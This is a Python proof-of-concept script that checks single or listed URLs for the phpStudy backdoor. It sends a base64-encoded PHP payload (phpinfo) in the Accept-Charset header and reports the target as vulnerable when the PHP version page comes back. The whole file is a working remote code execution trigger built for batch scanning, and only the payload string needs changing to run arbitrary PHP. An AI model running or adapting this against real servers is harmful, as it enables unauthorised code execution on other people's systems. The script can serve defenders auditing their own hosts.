# coding:utf-8
import requests
import sys
from colorama import Fore, init


def view():
    print('''
    
   _____                                      .__               
  /  _  \   ______ ___________    ______ _____|__| ____   ______
 /  /_\  \ /  ___//  ___/\__  \  /  ___//  ___/  |/    \ /  ___/
/    |    /\/\___ \ \___ \  / __ \_\___ \ \___ \|  |   |  /\/\___\ 
\____|__  /____  >____  >(____  /____  >____  >__|___|  /____  >
        \/     \/     \/      \/     \/     \/        \/     \/ 
 
                                          
Poc:
Accept-Encoding:gzip,deflate
Accept-Charset:cGhwaW5mbygpOw==

使用方式:         
python3 phpStudy_BackDoor.py -u http://127.0.0.1
python3 phpStudy_BackDoor.py -f url.txt
''')


def single():
    init(autoreset=True)
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
        'Accept-Encoding': 'gzip,deflate',
        'Accept-Charset': 'cGhwaW5mbygpOw=='
    }

    url = sys.argv[2]
    try:
        request = requests.get(url = url, headers = header,timeout=3)
        if 'PHP Version' in request.text:
            print(Fore.GREEN + '存在漏洞')
        else:
            print(Fore.RED + '不存在漏洞')
    except():
        pass


def batch():
    init(autoreset = True)
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
        'Accept-Encoding': 'gzip,deflate',
        'Accept-Charset': 'cGhwaW5mbygpOw=='
    }
    context = open(sys.argv[2])
    for url in context.readlines():
        try:
            request = requests.get(url = url.strip(), headers = header,timeout=3)
            if 'PHP Version' in request.text:
                print(Fore.GREEN + '[+]存在漏洞', request.url)
            else:
                print(Fore.RED + '[-]不存在漏洞', request.url)
        except():
            pass
    context.close()


def main():
    if len(sys.argv) >= 2:
        if sys.argv[1] == '-u':
            single()
        elif sys.argv[1] == '-f':
            batch()
        else:
            view()
    else:
        view()


if __name__ == '__main__':
    main()